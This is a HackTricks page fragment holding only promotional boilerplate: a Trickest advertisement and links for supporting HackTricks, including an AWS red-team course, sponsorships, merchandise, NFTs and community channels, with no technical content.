Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
